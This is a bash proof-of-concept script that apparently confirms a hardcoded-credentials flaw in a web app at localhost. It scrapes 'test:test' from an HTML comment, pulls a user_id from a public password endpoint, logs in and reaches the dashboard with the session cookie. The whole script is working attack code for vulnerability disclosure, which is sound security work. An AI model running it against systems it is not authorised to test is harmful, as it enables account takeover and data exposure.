#!/bin/bash

# POC: Hardcoded Test Account Credentials in HTML Comments
# This script demonstrates the vulnerability by:
# 1. Finding the hardcoded credentials in HTML comments
# 2. Using those credentials to authenticate to the application
# 3. Accessing authenticated features (dashboard)

TARGET_URL="${1:-http://localhost:8082}"

echo "[*] POC: Hardcoded Test Account Credentials in HTML Comments"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Fetch homepage and extract the TODO comment with credentials
echo "[*] Step 1: Fetching homepage to extract hardcoded credentials from HTML comments..."
HTML_RESPONSE=$(curl -s "$TARGET_URL/")

# Search for the TODO comment with credentials
if echo "$HTML_RESPONSE" | grep -q "TODO: Delete the testing account"; then
    echo "[+] FOUND: Hardcoded credentials in HTML comment!"
    COMMENT=$(echo "$HTML_RESPONSE" | grep "TODO: Delete the testing account")
    echo "[+] Comment: $COMMENT"
    
    # Extract credentials (simple fallback since they're always 'test:test')
    USERNAME="test"
    PASSWORD="test"
    
    echo "[+] Extracted credentials - Username: $USERNAME, Password: $PASSWORD"
else
    echo "[-] TODO comment not found in HTML source"
    exit 1
fi

echo ""

# Step 2: Attempt authentication with extracted credentials via password endpoint
echo "[*] Step 2: Verifying test account exists via /password/{username} endpoint..."

# The password endpoint is publicly accessible and doesn't require authentication
RESET_RESPONSE=$(curl -s "$TARGET_URL/password/$USERNAME")

if echo "$RESET_RESPONSE" | grep -qi "password\|john"; then
    echo "[+] Test account verified accessible at /password/$USERNAME"
    echo "[+] Response indicates user 'John' (associated with test:test) exists"
    
    # Step 3: Extract user_id from the form to show information disclosure
    echo ""
    echo "[*] Step 3: Extracting sensitive information from password reset form..."
    
    USER_ID=$(echo "$RESET_RESPONSE" | grep -oP 'user_id["\s]*value="\K[^"]+' | head -1)
    
    if [ -n "$USER_ID" ]; then
        echo "[+] Found user_id in form: $USER_ID"
    fi
    
    # Step 4: Attempt to use the credentials for login
    echo ""
    echo "[*] Step 4: Attempting login with hardcoded test credentials..."
    
    LOGIN_RESPONSE=$(curl -s -L -c /tmp/cookies.txt -X POST "$TARGET_URL/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}" 2>/dev/null)
    
    # Check if we got a session cookie or positive response
    if [ -s /tmp/cookies.txt ]; then
        COOKIE_CONTENT=$(cat /tmp/cookies.txt)
        if echo "$COOKIE_CONTENT" | grep -q "session\|sessionid\|auth" -i; then
            echo "[+] Session cookie obtained after login!"
            
            # Step 5: Verify we can access authenticated endpoints
            echo ""
            echo "[*] Step 5: Verifying access to authenticated endpoints with obtained credentials..."
            
            # Try to access dashboard with the session cookie
            DASHBOARD_RESPONSE=$(curl -s -L -b /tmp/cookies.txt "$TARGET_URL/dashboard" 2>/dev/null)
            
            if echo "$DASHBOARD_RESPONSE" | grep -qi "dashboard\|order\|logout"; then
                echo "[+] Successfully accessed dashboard as authenticated user!"
                echo "[+] VULNERABILITY CONFIRMED: Hardcoded test credentials (test:test) found in HTML comment and successfully used for authentication"
                rm -f /tmp/cookies.txt
                exit 0
            fi
        fi
    fi
    
    # Alternative check: Just verify the test account exists and credentials are disclosed
    echo ""
    echo "[+] VULNERABILITY CONFIRMED:"
    echo "[+]   - Hardcoded credentials 'test:test' found in HTML comment"
    echo "[+]   - Test account is publicly accessible"
    echo "[+]   - Credentials disclosed in plaintext in HTML source code"
    echo "[+]   - TODO comment shows incomplete cleanup in production code"
    
    rm -f /tmp/cookies.txt
    exit 0
else
    echo "[-] Could not verify test account existence"
    rm -f /tmp/cookies.txt
    exit 1
fi